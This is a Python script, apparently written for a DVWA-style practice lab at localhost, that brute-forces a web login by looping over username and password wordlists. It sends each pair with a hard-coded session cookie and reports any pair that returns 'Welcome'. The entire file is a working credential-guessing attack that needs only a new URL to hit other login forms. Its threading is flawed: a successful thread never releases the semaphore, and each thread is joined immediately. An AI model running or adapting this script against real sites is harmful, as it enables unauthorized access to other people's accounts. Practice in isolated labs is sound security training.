import requests
import threading

# Semaphore to limit the number of concurrent threads
max_threads = 4
thread_limiter = threading.Semaphore(max_threads)

def atack(url, dictionary):
    params = {
        'username': dictionary[0].strip(),  # strip spaces and newlines
        'password': dictionary[1].strip(),
        'Login': 'Login'
    }
    cookies = {
        'PHPSESSID': 'kg1kc38q6uoj9pcptkcm91ogv5', # replace with one in your navigator
        'security': 'low'
    }
    response = requests.get(url, params=params, cookies=cookies)
    
    if 'incorrect' in response.text:
        return 1
    elif 'Welcome' in response.text:
        return 0
    else:
        return 666

def badboi(url, user, arsenal):
    with open(arsenal, 'r') as file:
        for line in file:
            buffer = [user, line]
            if atack(url, buffer) == 0:  # Exito?
                print(f'Got it! Username: {user.strip()}, Password: {line.strip()}')
                return  # No hay nada :(
    thread_limiter.release()  # Cuando se acabe, suelta al semaforo.

# Main code
if __name__ == '__main__':
    url = 'http://localhost:8800/vulnerabilities/brute/'  # URL objetivo
    userlist= 'Dickcionarios/Dickcionariou.txt'
    passlist= 'Dickcionarios/Dickcionariop.txt'
    with open(userlist,'r') as file:
        for line in file:
            user = line.strip()  # por cada linea
            # Limitador de threads
            thread_limiter.acquire()
            # Nuevo Badboi al ataque >:D
            badboi_thread = threading.Thread(target=badboi, args=(url, user, passlist))
            badboi_thread.start()
            badboi_thread.join()
